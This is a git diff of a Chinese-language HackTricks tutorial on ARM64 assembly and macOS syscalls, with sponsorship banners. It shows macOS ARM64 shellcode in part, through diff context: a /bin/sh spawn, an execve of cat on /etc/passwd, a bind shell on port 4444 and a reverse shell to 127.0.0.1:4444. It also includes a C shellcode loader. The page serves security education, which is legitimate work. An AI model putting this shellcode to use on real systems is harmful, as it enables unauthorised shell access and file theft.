@@ -1,134 +1,138 @@
-# ARM64简介
+# ARM64基础汇编
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零到英雄学习AWS黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>
 
-* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
+支持HackTricks的其他方式：
+
+* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
 ## **ARM64简介**
 
-ARM64，也被称为ARMv8-A，是一种64位处理器架构，用于各种设备，包括智能手机、平板电脑、服务器，甚至一些高端个人电脑（macOS）。它是ARM Holdings公司的产品，该公司以其节能的处理器设计而闻名。
+ARM64，也称为ARMv8-A，是一种64位处理器架构，用于各种类型的设备，包括智能手机、平板电脑、服务器，甚至一些高端个人电脑（macOS）。它是ARM控股公司的产品，该公司以其节能的处理器设计而闻名。
 
 ### **寄存器**
 
-ARM64有**31个通用寄存器**，标记为`x0`到`x30`。每个寄存器可以存储一个**64位**（8字节）的值。对于只需要32位值的操作，可以使用名为w0到w30的32位模式访问相同的寄存器。
+ARM64有**31个通用寄存器**，标记为`x0`至`x30`。每个可以存储**64位**（8字节）的值。对于只需要32位值的操作，可以使用w0至w30的名称以32位模式访问相同的寄存器。
 
-1. **`x0`**到**`x7`** - 通常用作临时寄存器和传递子程序参数。
-* **`x0`**还携带函数的返回数据
-2. **`x8`** - 在Linux内核中，`x8`用作`svc`指令的系统调用号。**在macOS中，使用x16！**
-3. **`x9`**到**`x15`** - 更多的临时寄存器，通常用于局部变量。
-4. **`x16`**和**`x17`** - 临时寄存器，也用于间接函数调用和PLT（Procedure Linkage Table）存根。
-* **`x16`**用作**`svc`**指令的**系统调用号**。
-5. **`x18`** - 平台寄存器。在某些平台上，该寄存器保留用于特定平台的用途。
-6. **`x19`**到**`x28`** - 这些是被调用者保存的寄存器。函数必须保留这些寄存器的值供其调用者使用。
+1. **`x0`** 至 **`x7`** - 这些通常用作临时寄存器，用于向子程序传递参数。
+* **`x0`** 还携带函数的返回数据
+2. **`x8`** - 在Linux内核中，`x8`用作`svc`指令的系统调用号。**在macOS中使用的是x16！**
+3. **`x9`** 至 **`x15`** - 更多的临时寄存器，常用于局部变量。
+4. **`x16`** 和 **`x17`** - 临时寄存器，也用于间接函数调用和PLT（程序链接表）存根。
+* **`x16`** 用作**`svc`** 指令的**系统调用号**。
+5. **`x18`** - 平台寄存器。在某些平台上，此寄存器保留供平台特定用途。
+6. **`x19`** 至 **`x28`** - 这些是被调用者保存的寄存器。函数必须为其调用者保留这些寄存器的值。
 7. **`x29`** - **帧指针**。
 8. **`x30`** - 链接寄存器。当执行`BL`（带链接的分支）或`BLR`（带链接到寄存器的分支）指令时，它保存返回地址。
-9. **`sp`** - **堆栈指针**，用于跟踪堆栈的顶部。
-10. **`pc`** - **程序计数器**，指向将要执行的下一条指令。
+9. **`sp`** - **栈指针**，用于跟踪栈顶。
+10. **`pc`** - **程序计数器**，指向下一条要执行的指令。
 
 ### **调用约定**
 
-ARM64调用约定规定，函数的**前八个参数**通过寄存器**`x0`到`x7`**传递。**额外的**参数通过**堆栈**传递。**返回**值通过寄存器**`x0`**传回，如果是**128位**的话，也可以通过**`x1`**传回。函数调用时，**`x19`**到**`x30`**和**`sp`**寄存器必须被**保留**。
+ARM64调用约定规定，函数的**前八个参数**通过寄存器**`x0`至`x7`**传递。**额外的**参数通过**栈**传递。**返回**值通过寄存器**`x0`**返回，如果是128位的话，也可以通过**`x1`**返回。**`x19`**至**`x30`**和**`sp`**寄存器必须在函数调用中被**保留**。
 
-在汇编中阅读函数时，要查找**函数序言和尾声**。**序言**通常涉及**保存帧指针（`x29`）**，**设置新的帧指针**和**分配堆栈空间**。**尾声**通常涉及**恢复保存的帧指针**和**从函数返回**。
+阅读汇编中的函数时，寻找**函数序言和尾声**。**序言**通常涉及**保存帧指针（`x29`）**，**设置**新的**帧指针**，和**分配栈空间**。**尾声**通常涉及**恢复保存的帧指针**和**从函数返回**。
 
 ### Swift中的调用约定
 
-Swift有自己的**调用约定**，可以在[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)找到。
+Swift有其自己的**调用约定**，可以在[**这里找到**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
 
-### **常见指令**
+### **常用指令**
 
-ARM64指令通常具有**`opcode dst, src1, src2`**的格式，其中**`opcode`**是要执行的**操作**（如`add`、`sub`、`mov`等），**`dst`**是结果将被存储的**目标**寄存器，**`src1`**和**`src2`**是**源**寄存器。也可以使用立即值代替源寄存器。
+ARM64指令通常具有**格式`opcode dst, src1, src2`**，其中**`opcode`**是要执行的**操作**（如`add`、`sub`、`mov`等），**`dst`**是将存储结果的**目标**寄存器，**`src1`**和**`src2`**是**源**寄存器。立即数也可以代替源寄存器使用。
 
-* **`mov`**：将一个值从一个**寄存器**移动到另一个寄存器。
-* 示例：`mov x0, x1` - 这将将`x1`中的值移动到`x0`中。
-* **`ldr`**：将一个值从**内存**加载到**寄存器**中。
-* 示例：`ldr x0, [x1]` - 这将从由`x1`指向的内存位置加载一个值到`x0`中。
-* **`str`**：将一个值从寄存器存储到内存中。
-* 示例：`str x0, [x1]` - 这将将`x0`中的值存储到由`x1`指向的内存位置中。
-* **`ldp`**：**加载一对寄存器**。该指令从**连续的内存**位置加载两个寄存器。内存地址通常是通过将偏移量添加到另一个寄存器中的值来形成的。
-* 示例：`ldp x0, x1, [x2]` - 这将从`x2`和`x2 + 8`处的内存位置分别加载`x0`和`x1`。
-* **`stp`**：**存储一对寄存器**。该指令将两个寄存器存储到**连续的内存**位置。内存地址通常是通过将偏移量添加到另一个寄存器中的值来形成的。
-* 示例：`stp x0, x1, [x2]` - 这将`x0`和`x1`存储到`x2`和`x2 + 8`处的内存位置。
-* **`add`**：将两个寄存器的值相加，并将结果存储在一个寄存器中。
-* 示例：`add x0, x1, x2` — 这将`x1`和`x2`中的值相加，并将结果存储在`x0`中。
-* **`sub`**：将两个寄存器的值相减，并将结果存储在一个寄存器中。
-* 示例：`sub x0, x1, x2` — 这将`x1`中的值减去`x2`的值，并将结果存储在`x0`中。
-* **`mul`**：将两个寄存器的值相乘，并将结果存储在一个寄存器中。
-* 示例：`mul x0, x1, x2` — 这将`x1`和`x2`中的值相乘，并将结果存储在`x0`中。
-* **`div`**：将一个寄存器的值除以另一个寄存器的值，并将结果存储在一个寄存器中。
-* 示例：`div x0, x1, x2` — 这将`x1`中的值除以`x2`的值，并将结果存储在`x0`中。
-* **`bl`**：带链接的分支，用于调用子程序。将返回地址存储在`x30`中。
+* **`mov`**: **移动**一个值从一个**寄存器**到另一个。
+* 示例：`mov x0, x1` — 这将`x1`中的值移动到`x0`中。
+* **`ldr`**: **从内存加载**一个值到**寄存器**中。
+* 示例：`ldr x0, [x1]` — 这将`x1`指向的内存位置的值加载到`x0`中。
+* **`str`**: **将寄存器中的值存储**到**内存**中。
+* 示例：`str x0, [x1]` — 这将`x0`中的值存储到`x1`指向的内存位置。
+* **`ldp`**: **加载寄存器对**。此指令**从连续的内存位置加载两个寄存器**。内存地址通常通过向另一个寄存器的值添加偏移量来形成。
+* 示例：`ldp x0, x1, [x2]` — 这将`x0`和`x1`从`x2`和`x2 + 8`的内存位置加载。
+* **`stp`**: **存储寄存器对**。此指令**将两个寄存器存储到连续的内存位置**。内存地址通常通过向另一个寄存器的值添加偏移量来形成。
+* 示例：`stp x0, x1, [x2]` — 这将`x0`和`x1`存储到`x2`和`x2 + 8`的内存位置。
+* **`add`**: **将两个寄存器的值相加**并将结果存储在寄存器中。
+* 示例：`add x0, x1, x2` — 这将`x1`和`x2`中的值相加并将结果存储在`x0`中。
+* **`sub`**: **从一个寄存器中减去另一个寄存器的值**并将结果存储在寄存器中。
+* 示例：`sub x0, x1, x2` — 这将`x2`中的值从`x1`中减去并将结果存储在`x0`中。
+* **`mul`**: **将两个寄存器的值相乘**并将结果存储在寄存器中。
+* 示例：`mul x0, x1, x2` — 这将`x1`和`x2`中的值相乘并将结果存储在`x0`中。
+* **`div`**: **将一个寄存器的值除以另一个**并将结果存储在寄存器中。
+* 示例：`div x0, x1, x2` — 这将`x1`中的值除以`x2`并将结果存储在`x0`中。
+* **`bl`**: **带链接的分支**，用于**调用**一个**子程序**。将**返回地址存储在`x30`**中。
 * 示例：`bl myFunction` — 这将调用函数`myFunction`并将返回地址存储在`x30`中。
-* **`blr`**：带链接的寄存器分支，用于调用寄存器中指定的子程序。将返回地址存储在`x30`中。
-* 示例：`blr x1` — 这将调用地址包含在`x1`中的函数，并将返回地址存储在`x30`中。
-* **`ret`**：从子程序返回，通常使用`x30`中的地址。
+* **`blr`**: **带链接到寄存器的分支**，用于**调用**一个目标在**寄存器中指定**的**子程序**。将返回地址存储在`x30`中。
+* 示例：`blr x1` — 这将调用地址包含在`x1`中的函数并将返回地址存储在`x30`中。
+* **`ret`**: **从子程序返回**，通常使用**`x30`**中的地址。
 * 示例：`ret` — 这将使用`x30`中的返回地址从当前子程序返回。
-* **`cmp`**：比较两个寄存器的值并设置条件标志。
-* 示例：`cmp x0, x1` — 这将比较`x0`和`x1`中的值，并相应地设置条件标志。
-* **`b.eq`**：如果前面的`cmp`指令发现两个相等的值，则跳转到标签。
-* 示例：`b.eq label` — 如果前面的`cmp`指令发现`x0`和`x1`中的值相等，则跳转到`label`。
-* **`b.ne`**：如果不相等，则根据条件标志（由先前的比较指令设置）跳转到标签或地址。
-* 示例：在`cmp x0, x1`指令之后，`b.ne label` — 如果`x0`和`x1`中的值不相等，则跳转到`label`。
-* **`cbz`**：比较并在零时跳转。此指令将一个寄存器与零进行比较，如果相等，则跳转到标签或地址。
-* 示例：`cbz x0, label` — 如果`x0`中的值为零，则跳转到`label`。
-* **`cbnz`**：比较并在非零时跳转。此指令将一个寄存器与零进行比较，如果不相等，则跳转到标签或地址。
-* 示例：`cbnz x0, label` — 如果`x0`中的值非零，则跳转到`label`。
-* **`adrp`**：计算符号的页地址并将其存储在一个寄存器中。
-* 示例：`adrp x0, symbol` — 这将计算`symbol`的页地址并将其存储在`x0`中。
-* **`ldrsw`**：从内存中加载一个有符号的32位值，并将其符号扩展为64位。
-* 示例：`ldrsw x0, [x1]` — 这将从`x1`指向的内存位置加载一个有符号的32位值，将其符号扩展为64位，并将其存储在`x0`中。
-* **`stur`**：将寄存器的值存储到内存位置，使用另一个寄存器的偏移量。
-* 示例：`stur x0, [x1, #4]` — 这将将`x0`中的值存储到当前`x1`地址加4字节的内存位置。
-* **`svc`**：进行系统调用。它代表"Supervisor Call"。当处理器执行此指令时，它将从用户模式切换到内核模式，并跳转到内存中内核系统调用处理代码的特定位置。
-* 示例：
+* **`cmp`**: **比较两个寄存器**并设置条件标志。
+* 示例：`cmp x0, x1` — 这将比较`x0`和`x1`中的值并相应地设置条件标志。
+* **`b.eq`**: **如果相等则分支**，基于之前的`cmp`指令。
+* 示例：`b.eq label` — 如果之前的`cmp`指令发现两个相等的值，这将跳转到`label`。
+* **`b.ne`**: **如果不相等则分支**。此指令检查条件标志（由之前的比较指令设置），如果比较的值不相等，它将分支到一个标签或地址。
+* 示例：在`cmp x0, x1`指令之后，`b.ne label` — 如果`x0`和`x1`中的值不相等，这将跳转到`label`。
+* **`cbz`**: **比较并在零时分支**。此指令将寄存器与零进行比较，如果它们相等，它将分支到一个标签或地址。
+* 示例：`cbz x0, label` — 如果`x0`中的值为零，这将跳转到`label`。
+* **`cbnz`**: **比较并在非零时分支**。此指令将寄存器与零进行比较，如果它们不相等，它将分支到一个标签或地址。
+* 示例：`cbnz x0, label` — 如果`x0`中的值非零，这将跳转到`label`。
+* **`adrp`**: 计算符号的**页面地址**并将其存储在寄存器中。
+* 示例：`adrp x0, symbol` — 这将计算`symbol`的页面地址并将其存储在`x0`中。
+* **`ldrsw`**: **从内存加载**一个有符号的**32位**值并将其**符号扩展到64**位。
+* 示例：`ldrsw x0, [x1]` — 这将从`x1`指向的内存位置加载一个有符号的32位值，将其符号扩展到64位，并将其存储在`x0`中。
+* **`stur`**: **将寄存器值存储到内存位置**，使用另一个寄存器的偏移量。
+* 示例：`stur x0, [x1, #4]` — 这将`x0`中的值存储到内存地址中，该地址比`x1`中当前的地址大4字节。
+* &#x20;**`svc`** : 发起一个**系统调用**。它代表"Supervisor Call"。当处理器执行此指令时，它**从用户模式切换到内核模式**并跳转到内存中的特定位置，那里是**内核的系统调用处理**代码所在。
+*   示例：&#x20;
 
 ```armasm
 mov x8, 93  ; 将退出的系统调用号（93）加载到寄存器x8中。
 mov x0, 0   ; 将退出状态码（0）加载到寄存器x0中。
-svc 0       ; 进行系统调用。
+svc 0       ; 发起系统调用。
 ```
 
 ### **函数序言**
 
-1. **将链接寄存器和帧指针保存到堆栈中**：
+1.  **将链接寄存器和帧指针保存到栈中**：
 
+{% code overflow="wrap" %}
 ```armasm
-stp x29, x30, [sp, #-16]!  ; 将x29和x30寄存器对存储到堆栈中，并减小堆栈指针
+stp x29, x30, [sp, #-16]!  ; 将x29和x30对存储到栈中并递减栈指针
 ```
+{% endcode %}
+2. **设置新的帧指针**: `mov x29, sp` (为当前函数设置新的帧指针)
+3. **为局部变量在栈上分配空间**（如果需要）: `sub sp, sp, <size>`（其中`<size>`是所需的字节数）
 
-2. **设置新的帧指针**：`mov x29, sp`（为当前函数设置新的帧指针）
-3. **为局部变量在堆栈上分配空间**（如果需要）：`sub sp, sp, <size>`（其中`<size>`是所需的字节数）
+### **函数尾声**
 
-### **函数收尾**
+1. **释放局部变量空间**（如果分配了的话）: `add sp, sp, <size>`
+2.  **恢复链接寄存器和帧指针**：
 
-1. **释放局部变量（如果有分配的变量）**：`add sp, sp, <size>`
-2. **恢复链接寄存器和帧指针**：
-
+{% code overflow="wrap" %}
 ```armasm
-ldp x29, x30, [sp], #16  ; 从堆栈中加载x29和x30寄存器对，并增加堆栈指针
+ldp x29, x30, [sp], #16  ; 从栈中加载x29和x30对并递增栈指针
 ```
-
-3. **返回**：`ret`（使用链接寄存器中的地址将控制返回给调用者）
+{% endcode %}
+3. **返回**: `ret` (使用链接寄存器中的地址将控制权返回给调用者)
 
 ## macOS
 
 ### BSD系统调用
 
-查看[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)。BSD系统调用将具有**x16 > 0**。
+查看[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)。BSD系统调用将有**x16 > 0**。
 
 ### Mach陷阱
 
-查看[**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html)。Mach陷阱将具有**x16 < 0**，因此您需要使用前面列表中的数字加上负号来调用：**`_kernelrpc_mach_vm_allocate_trap`**是**`-10`**。
+查看[**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html)。Mach陷阱将有**x16 < 0**，所以你需要用**负数**调用前面列表中的数字：**`_kernelrpc_mach_vm_allocate_trap`** 是 **`-10`**。
 
-您还可以在反汇编器中检查**`libsystem_kernel.dylib`**，以找到如何调用这些（和BSD）系统调用的方法：
+你也可以在反汇编器中检查**`libsystem_kernel.dylib`**来找到如何调用这些（和BSD）系统调用：
 ```bash
 # macOS
 dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
@@ -137,12 +141,12 @@ dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Lib
 dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
 ```
 {% hint style="success" %}
-有时候，检查来自`libsystem_kernel.dylib`的**反编译**代码比检查**源代码**更容易，因为一些系统调用（BSD和Mach）的代码是通过脚本生成的（请检查源代码中的注释），而在dylib中，你可以找到正在被调用的内容。
+有时候检查 **`libsystem_kernel.dylib`** 中的**反编译**代码比检查**源代码**要容易，因为许多系统调用（BSD和Mach）的代码是通过脚本生成的（查看源代码中的注释），而在dylib中你可以找到正在被调用的内容。
 {% endhint %}
 
 ### Shellcodes
 
-编译：
+编译方法：
 ```bash
 as -o shell.o shell.s
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
@@ -150,14 +154,7 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 # You could also use this
 ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
 ```
-提取字节的方法如下：
-
-```assembly
-ldr x0, =0x12345678
-ldrb w1, [x0]
-```
-
-这段代码用于从内存地址0x12345678中提取一个字节。
+提取字节：
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
 for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
@@ -166,7 +163,7 @@ done
 ```
 <details>
 
-<summary>用于测试shellcode的C代码</summary>
+<summary>C代码用于测试shellcode</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -216,10 +213,10 @@ return 0;
 
 #### Shell
 
-从[**这里**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)获取并解释。
+取自[**这里**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)并进行了解释。
 
 {% tabs %}
-{% tab title="使用adr" %}
+{% tab title="使用 adr" %}
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
 .global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
@@ -234,7 +231,9 @@ svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter,
 
 sh_path: .asciz "/bin/sh"
 ```
-{% tab title="使用堆栈" %}
+{% endtab %}
+
+{% tab title="使用栈" %}
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
 .global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
@@ -266,9 +265,9 @@ svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter,
 {% endtab %}
 {% endtabs %}
 
-#### 使用cat命令读取
+#### 使用 cat 读取
 
-目标是执行`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`，因此第二个参数（x1）是一个参数数组（在内存中表示为地址的堆栈）。
+目标是执行 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`，因此第二个参数（x1）是参数数组（在内存中，这意味着地址的堆栈）。
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -294,43 +293,7 @@ cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
 ```
-#### 使用fork从sh调用命令，以便主进程不被终止
-
-To invoke a command with `sh` from a forked process, you can follow these steps:
-
-1. Import the necessary libraries:
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-```
-
-2. Create a forked process using the `fork()` function:
-```c
-pid_t pid = fork();
-```
-
-3. Check if the process is the child process:
-```c
-if (pid == 0) {
-    // Child process
-    // Execute the command using sh
-    execl("/bin/sh", "sh", "-c", "your_command", (char *)NULL);
-    exit(0);
-}
-```
-
-4. Wait for the child process to finish executing the command:
-```c
-else {
-    // Parent process
-    wait(NULL);
-}
-```
-
-By using this approach, the main process will not be terminated when invoking the command with `sh` from the forked process.
+#### 通过 fork 调用 sh 命令，这样主进程不会被终止
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -374,9 +337,9 @@ sh_c_option: .asciz "-c"
 .align 2
 touch_command: .asciz "touch /tmp/lalala"
 ```
-#### 绑定 shell
+#### 绑定 Shell
 
-从 [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) 获取绑定 shell，端口为 **4444**。
+绑定 Shell 来自 [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) 在 **端口 4444**上
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -460,7 +423,7 @@ svc  #0x1337
 ```
 #### 反向 shell
 
-从 [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s)，反向 shell 到 **127.0.0.1:4444**
+来自 [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s)，revshell 至 **127.0.0.1:4444**
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -529,12 +492,14 @@ svc  #0x1337
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零到英雄学习AWS黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
+支持HackTricks的其他方式：
+
+* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
